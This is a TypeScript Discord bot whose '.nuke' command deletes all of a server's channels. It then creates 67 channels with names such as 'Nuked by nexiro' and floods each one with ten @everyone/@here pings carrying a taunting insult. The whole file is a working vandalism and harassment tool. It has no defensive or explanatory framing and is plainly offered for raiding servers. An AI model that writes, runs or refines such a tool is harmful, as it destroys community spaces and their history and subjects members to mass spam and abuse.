import dotenv from 'dotenv';
import { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, TextChannel } from 'discord.js';

dotenv.config();

const TOKEN = process.env.DISCORD_TOKEN;
if (!TOKEN) {
    console.error('Missing DISCORD_TOKEN in environment');
    process.exit(1);
}

const PREFIX = '.';
const CHANNEL_COUNT = 67;
const PINGS_PER_CHANNEL = 10;

const SPAM_MESSAGE = `> tamed by aikoware, kryzen
__denzxu bading HAHAHA IYAK kana boy sama mo na xenondot nyo__
@everyone @here`;

const CHANNEL_NAMES = [
    'Nuked by nexiro',
    'tamed by nex',
    'nuked by untog'
];

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user?.tag}`);
    console.log(`Command prefix: ${PREFIX}nuke`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;
    if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
        await message.reply('❌ You need Administrator permission.');
        return;
    }

    const cmd = message.content.slice(PREFIX.length).trim().toLowerCase();
    if (cmd !== 'nuke') return;

    const guild = message.guild;
    if (!guild) return;

    await message.reply(`⏳ Deleting all channels, then creating ${CHANNEL_COUNT} new ones and spamming...`);

    // 1. Delete all existing channels
    const allChannels = guild.channels.cache;
    for (const channel of allChannels.values()) {
        if (channel.deletable) {
            try {
                await channel.delete(`Nuked by ${message.author.tag}`);
            } catch (err) {
                console.error(`Failed to delete ${channel.name}:`, err);
            }
        }
    }

    // 2. Create new channels and spam
    let created = 0;
    for (let i = 0; i < CHANNEL_COUNT; i++) {
        try {
            const baseName = CHANNEL_NAMES[Math.floor(Math.random() * CHANNEL_NAMES.length)];
            // Discord requires unique channel names; add a timestamp suffix
            const uniqueName = `${baseName}-${Date.now()}-${i}`.slice(0, 100);
            const channel = await guild.channels.create({
                name: uniqueName,
                type: ChannelType.GuildText,
                reason: 'Nuke spam'
            }) as TextChannel;

            // Send pings as fast as possible
            for (let j = 0; j < PINGS_PER_CHANNEL; j++) {
                await channel.send(SPAM_MESSAGE);
            }
            created++;
        } catch (err) {
            console.error(`Failed on channel ${i+1}:`, err);
        }
    }

    await message.reply(`✅ Done. Deleted all old channels. Created ${created}/${CHANNEL_COUNT} new channels, sent ${PINGS_PER_CHANNEL} pings each.`);
});

client.login(TOKEN);
